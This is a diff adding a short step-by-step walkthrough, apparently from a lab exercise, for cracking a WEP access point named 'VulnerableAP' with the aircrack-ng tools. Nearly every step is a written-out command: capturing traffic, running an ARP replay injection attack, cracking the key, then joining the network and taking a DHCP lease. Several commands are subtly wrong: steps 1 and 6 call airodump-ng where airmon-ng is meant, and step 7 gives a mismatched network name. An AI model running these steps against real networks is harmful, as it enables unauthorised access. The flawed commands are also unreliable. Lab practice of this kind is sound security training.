@@ -1,0 +1,23 @@
+1. Place interface in monitor mode with Airmon-Ng.
+# airodump-ng start wlanX
+
+2. Start monitoring traffic with Airodump-Ng.
+# airodump-ng wlanXmon
+
+3. Focus monitoring of traffic on the router with BSSID 02:13:37:BE:EF:03 on channel X.
+# airodump-ng --bssid 02:13:37:BE:EF:03 -c X --write wep_passwordcrack wlanXmon
+
+4. In a second terminal window, start the ARP Request Replay attack after identifying the MAC address of the router and client from the previous command.
+# aireplay-ng -3 -b 02:13:37:BE:EF:03 -h 02:00:00:00:03:00 wlan0mon
+
+5. In a third terminal window, after collecting enough packets, crack the passphrase using aircrack-ng and the network capture “wep_passwordcrack-01.cap” file generated in the 1st terminal window from step 3. 
+# aircrack-ng wep_passwordcrack-01.cap
+
+6. Stop monitor mode on the interface with Airmon-Ng.
+# airodump-ng stop wlanXmon
+
+7. Manually connect to the Access Point with the ESSID of “VulnerableAP” and the key that was discovered in Step 5.
+# iwconfig wlan0 essid Vulnerable key "2E:2C:F0:E3:FF"
+
+8. After successfully connecting to the Access Point, I request a DHCP lease using dhclient.
+# dhclient wlan0
